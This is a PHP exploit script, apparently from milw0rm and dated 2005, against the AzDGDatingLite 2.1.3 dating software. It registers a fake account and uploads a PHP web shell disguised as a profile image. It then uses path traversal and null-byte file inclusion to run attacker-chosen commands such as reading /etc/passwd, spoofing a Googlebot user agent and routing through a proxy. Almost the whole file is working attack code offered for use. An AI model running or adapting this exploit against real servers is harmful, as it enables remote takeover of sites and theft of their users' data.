@@ -1,0 +1,441 @@
+<?php
+#   azdgexpl.php                                                               #
+#                                                                              #
+#   AzDGDatingLite V 2.1.3 ( possibly prior versions) remote code execution    #
+#   with generic http proxy support                                            #
+#                                                                              #
+#                                by rgod                                       #
+#                      site: http://rgod.altervista.org                        #
+#                                                                              #
+#   make these changes in php.ini if you have troubles                         #
+#   to launch this script:                                                     #
+#   allow_call_time_pass_reference = on                                        #
+#   register_globals = on                                                      #
+#                                                                              #
+#   usage: launch this script from Apache, fill requested fields, then         #
+#   go!                                                                        #
+#                                                                              #
+#   Sun-tzu: "Therefore, I say: Know your enemy and know yourself; in a        #
+#   hundred battles, you will never be defeated. When you are ignorant         #
+#   of the enemy but know yourself, your chances of winning or losing          #
+#   are equal. If ignorant both of your enemy and of yourself, you are         #
+#   sure to be defeated in every battle."                                      #
+#                                                                              #
+
+
+error_reporting(0);
+ini_set("max_execution_time",0);
+ini_set("default_socket_timeout", 2);
+ob_implicit_flush (1);
+
+echo'<head><title>AzDGDatingLite V 2.1.3  remote commands execution</title><meta
+http-equiv="Content-Type"  content="text/html; charset=iso-8859-1"> <style type=
+"text/css"> <!-- body,td,th {color:  #00FF00;} body {background-color: #000000;}
+.Stile5 {font-family: Verdana, Arial, Helvetica,  sans-serif; font-size: 10px; }
+.Stile6 {font-family: Verdana, Arial, Helvetica, sans-serif; font-weight:  bold;
+font-style: italic; } --> </style></head> <body> <p class="Stile6"> AzDGDatingLi
+te V 2.1.3 (possibly prior versions) remote commands execution</p><p class="Stil
+e6">a script by rgod at <a href="http://rgod.altervista.org"    target="_blank">
+http://rgod.altervista.org</a></p><table width="84%"><tr><td width="43%"> <form
+name="form1"      method="post"   action="'.$SERVER[PHP_SELF].'?path=value&host=
+value&port=value&command=value&proxy=value&uploaddir=value"> <p>    <input type=
+"text" name="host"><span class="Stile5">hostname (ex: www.sitename.com)  </span>
+</p><p><input type="text" name="path"><span class="Stile5">  path (ex: /azdg/ or
+just /) </span></p><p><input type="text"   name="port" >   <span class="Stile5">
+specify a port other than 80 (default value)  </span></p><p> <input  type="text"
+name="command"> <span  class="Stile5"> a Unix command , example: ls -la  to list
+directories, cat /etc/passwd to show passwd file </span></p><p><input type="text
+" name="proxy"> <span class="Stile5"> send exploit through an HTTP proxy (ip:por
+t</span></p> <p> <input  type="submit"name="Submit" value="go!"></p></form></td>
+</tr></table></body></html>';
+
+function make_seed()
+{
+   list($usec, $sec) = explode(' ', microtime());
+   return (float) $sec + ((float) $usec * 100000);
+}
+
+function show($headeri)
+{
+$ii=0;
+$ji=0;
+$ki=0;
+$ci=0;
+echo '<table border="0"><tr>';
+while ($ii <= strlen($headeri)-1)
+{
+$datai=dechex(ord($headeri[$ii]));
+if ($ji==16) {
+             $ji=0;
+             $ci++;
+             echo "<td>&nbsp;&nbsp;</td>";
+             for ($li=0; $li<=15; $li++)
+                      { echo "<td>".$headeri[$li+$ki]."</td>";
+			    }
+            $ki=$ki+16;
+            echo "</tr><tr>";
+            }
+if (strlen($datai)==1) {echo "<td>0".$datai."</td>";} else
+{echo "<td>".$datai."</td> ";}
+$ii++;
+$ji++;
+}
+for ($li=1; $li<=(16 - (strlen($headeri) % 16)+1); $li++)
+                      { echo "<td>&nbsp&nbsp</td>";
+                       }
+
+for ($li=$ci*16; $li<=strlen($headeri); $li++)
+                      { echo "<td>".$headeri[$li]."</td>";
+			    }
+echo "</tr></table>";
+}
+
+$proxy_regex = '(\b\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}\:\d{1,5}\b)';
+
+function sendpacket($packet)
+{
+global $proxy, $host, $port, $html;
+if ($proxy=='')
+           {$ock=fsockopen(gethostbyname($host),$port);}
+             else
+           {
+	    if (!eregi($proxy_regex,$proxy))
+	    {echo htmlentities($proxy).' -> not a valid proxy...';
+	     die;
+	    }
+	   $parts=explode(':',$proxy);
+	    echo 'Connecting to '.$parts[0].':'.$parts[1].' proxy...<br>';
+	    $ock=fsockopen($parts[0],$parts[1]);
+	    if (!$ock) { echo 'No response from proxy...';
+			die;
+		       }
+	   }
+fputs($ock,$packet);
+if ($proxy=='')
+  {
+
+    $html='';
+    while (!feof($ock))
+      {
+        $html.=fgets($ock);
+      }
+  }
+else
+  {
+    $html='';
+    while ((!feof($ock)) or (!eregi(chr(0x0d).chr(0x0a).chr(0x0d).chr(0x0a),$html)))
+    {
+      $html.=fread($ock,1);
+    }
+  }
+fclose($ock);
+echo nl2br(htmlentities($html));
+}
+
+if (($path<>'') and ($host<>'') and ($command<>''))
+{
+  if ($port=='') {$port=80;}
+
+# step 1 -> register and upload the evil jpeg file
+
+srand(make_seed());
+$anumber=rand(10000,99999);
+
+//do not modify absolutely CRLF and spaces here...
+$data='-----------------------------23281168279961
+Content-Disposition: form-data; name="l"
+
+default
+-----------------------------23281168279961
+Content-Disposition: form-data; name="a"
+
+a
+-----------------------------23281168279961
+Content-Disposition: form-data; name="fname"
+
+jimihendrix'.$anumber.'
+-----------------------------23281168279961
+Content-Disposition: form-data; name="lname"
+
+jimihendrix'.$anumber.'
+-----------------------------23281168279961
+Content-Disposition: form-data; name="pass"
+
+jimihendrix'.$anumber.'
+-----------------------------23281168279961
+Content-Disposition: form-data; name="rpass"
+
+jimihendrix'.$anumber.'
+-----------------------------23281168279961
+Content-Disposition: form-data; name="month"
+
+11
+-----------------------------23281168279961
+Content-Disposition: form-data; name="day"
+
+27
+-----------------------------23281168279961
+Content-Disposition: form-data; name="year"
+
+1942
+-----------------------------23281168279961
+Content-Disposition: form-data; name="gender"
+
+1
+-----------------------------23281168279961
+Content-Disposition: form-data; name="purpose"
+
+1
+-----------------------------23281168279961
+Content-Disposition: form-data; name="country"
+
+158
+-----------------------------23281168279961
+Content-Disposition: form-data; name="email"
+
+jimihendrix'.$anumber.'@hotmail.com
+-----------------------------23281168279961
+Content-Disposition: form-data; name="url"
+
+
+-----------------------------23281168279961
+Content-Disposition: form-data; name="icq"
+
+
+-----------------------------23281168279961
+Content-Disposition: form-data; name="aim"
+
+
+-----------------------------23281168279961
+Content-Disposition: form-data; name="phone"
+
+
+-----------------------------23281168279961
+Content-Disposition: form-data; name="city"
+
+
+-----------------------------23281168279961
+Content-Disposition: form-data; name="marstat"
+
+0
+-----------------------------23281168279961
+Content-Disposition: form-data; name="child"
+
+0
+-----------------------------23281168279961
+Content-Disposition: form-data; name="height"
+
+0
+-----------------------------23281168279961
+Content-Disposition: form-data; name="weight"
+
+0
+-----------------------------23281168279961
+Content-Disposition: form-data; name="hcolor"
+
+0
+-----------------------------23281168279961
+Content-Disposition: form-data; name="ecolor"
+
+0
+-----------------------------23281168279961
+Content-Disposition: form-data; name="etnicity"
+
+0
+-----------------------------23281168279961
+Content-Disposition: form-data; name="religion"
+
+0
+-----------------------------23281168279961
+Content-Disposition: form-data; name="smoke"
+
+0
+-----------------------------23281168279961
+Content-Disposition: form-data; name="drink"
+
+0
+-----------------------------23281168279961
+Content-Disposition: form-data; name="education"
+
+0
+-----------------------------23281168279961
+Content-Disposition: form-data; name="job"
+
+
+-----------------------------23281168279961
+Content-Disposition: form-data; name="hobby"
+
+
+-----------------------------23281168279961
+Content-Disposition: form-data; name="descr"
+
+rock star
+-----------------------------23281168279961
+Content-Disposition: form-data; name="sgender"
+
+0
+-----------------------------23281168279961
+Content-Disposition: form-data; name="setnicity"
+
+0
+-----------------------------23281168279961
+Content-Disposition: form-data; name="sreligion"
+
+0
+-----------------------------23281168279961
+Content-Disposition: form-data; name="agef"
+
+14
+-----------------------------23281168279961
+Content-Disposition: form-data; name="aget"
+
+60
+-----------------------------23281168279961
+Content-Disposition: form-data; name="heightf"
+
+1
+-----------------------------23281168279961
+Content-Disposition: form-data; name="heightt"
+
+22
+-----------------------------23281168279961
+Content-Disposition: form-data; name="weightf"
+
+1
+-----------------------------23281168279961
+Content-Disposition: form-data; name="weightt"
+
+45
+-----------------------------23281168279961
+Content-Disposition: form-data; name="hdyfu"
+
+0
+-----------------------------23281168279961
+Content-Disposition: form-data; name="file0"; filename="jimihendrix.gif"
+Content-Type: image/jpeg
+
+';
+
+$shell='<?php error_reporting(0); system($HTTP_GET_VARS[cmd].'."'".' > README'."'".'); ?>';
+
+$data.=$shell;
+
+$data.='
+-----------------------------23281168279961
+Content-Disposition: form-data; name="file1"; filename=""
+Content-Type: application/octet-stream
+
+
+-----------------------------23281168279961
+Content-Disposition: form-data; name="file2"; filename=""
+Content-Type: application/octet-stream
+
+
+-----------------------------23281168279961--';
+if ($proxy=='')
+{$packet="POST ".$path."/add.php HTTP/1.1\r\n";}
+else
+{$packet="POST http://".$host.$path."add.php HTTP/1.1\r\n";}
+$packet.="Host: ".$host."\r\n";
+$packet.="User-Agent: Googlebot/2.1 (+http://www.google.com/bot.html)\r\n";
+$packet.="Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5\r\n";
+$packet.="Accept-Language: en-us,en;q=0.5\r\n";
+$packet.="Accept-Encoding: gzip,deflate\r\n";
+$packet.="Accept-Charset: ISO-8859-1,utf-8;q=0.7,*;q=0.7\r\n";
+$packet.="Connection: close\r\n";
+$packet.="Referer: http://".$host.$path."add.php?l=default\r\n";
+$packet.="Cookie: PHPSESSID=13798fab78f7fa6e5bb501ac83329bdd\r\n";
+$packet.="Content-Type: multipart/form-data; boundary=---------------------------23281168279961\r\n";
+$packet.="Content-Length: ".strlen($data)."\r\n\r\n";
+$packet.=$data;
+show($packet);
+sendpacket($packet);
+
+#step 2 -> retrieve upload subdir name and filename from index e profile page
+if ($proxy=='')
+{$packet="GET ".$path." HTTP/1.0 \r\n";}
+else
+{$packet="GET http://".$host.$path." HTTP/1.0 \r\n";}
+$packet.="Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5\r\n";
+$packet.="Accept-Encoding: text/plain\r\n";
+$packet.="Host: ".$host."\r\n\r\n";
+$packet.="Connection: Close\r\n\r\n";
+show($packet);
+sendpacket($packet);
+
+$temp='';$i=0;
+while (!eregi('jimihendrix'.$anumber,$temp))
+{
+$temp.=$html[$i];
+$i=$i+1;
+if (eregi('</html>',$temp)) { die(" Exploit failed... ");}
+}
+
+$temp2=explode('<a href="',$temp);
+$temp3=count($temp2)-1;
+$temp=$temp2[$temp3];
+$temp2=explode('"',$temp);
+$profile=$temp2[0];
+
+echo '<br>retrieving shell path from /'.$profile.'<br><br>';
+
+if ($proxy=='')
+{$packet="GET ".$path.$profile." HTTP/1.0 \r\n";}
+else
+{$packet="GET http://".$host.$path.$profile." HTTP/1.0 \r\n";}
+$packet.="Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5\r\n";
+$packet.="Accept-Encoding: text/plain\r\n";
+$packet.="Host: ".$host."\r\n\r\n";
+$packet.="Connection: Close\r\n\r\n";
+show($packet);
+sendpacket($packet);
+
+$temp='';$i=0;
+while (!eregi('jimihendrix'.$anumber,$temp))
+{
+$temp.=$html[$i];
+$i=$i+1;
+if (eregi('</html>',$temp)) { die(" Exploit failed... ");}
+}
+
+$temp2=explode('<a href="',$temp);
+$temp3=count($temp2)-1;
+$temp=$temp2[$temp3];
+$temp2=explode('"',$temp);
+$shellfullpath=$temp2[0];
+
+echo '<br>Ok,found... shell is at '.$shellfullpath.'<br><br>';
+$temp=explode("/",$shellfullpath);
+$temp2=count($temp)-1;
+$subdir=$temp[$temp2-1];
+$filename=$temp[$temp2];
+
+# step 3 -> launch commands
+if ($proxy=='')
+{$packet="GET ".$path."include/security.inc.php?cmd=".urlencode($command)."&l=".urlencode("../../../members/uploads/".$subdir."/".$filename.chr(0x00))." HTTP/1.0 \r\n";}
+else
+{$packet="GET http://".$host.$path."include/security.inc.php?cmd=".urlencode($command)."&l=".urlencode("../../../members/uploads/".$subdir."/".$filename.chr(0x00))." HTTP/1.0 \r\n";}
+$packet.="Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5\r\n";
+$packet.="Accept-Encoding: text/plain\r\n";
+$packet.="Host: ".$host."\r\n\r\n";
+$packet.="Connection: Close\r\n\r\n";
+show($packet);
+sendpacket($packet);
+
+# step 4 -> making a GET request for redirected output
+echo '<br> if AzDGDatingLite is unpatched and vulnerable now you will see '.htmlentities($command).'output...<br><br>';
+
+if ($proxy=='')
+{$packet="GET ".$path."include/README HTTP/1.0 \r\n";}
+else
+{$packet="GET http://".$host.$path."include/README HTTP/1.0 \r\n";}
+$packet.="Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5\r\n";
+$packet.="Accept-Encoding: text/plain\r\n";
+$packet.="Host: ".$host."\r\n\r\n";
+$packet.="Connection: Close\r\n\r\n";
+show($packet);
+sendpacket($packet);
+}
+?>
+
+# milw0rm.com [2005-09-13]
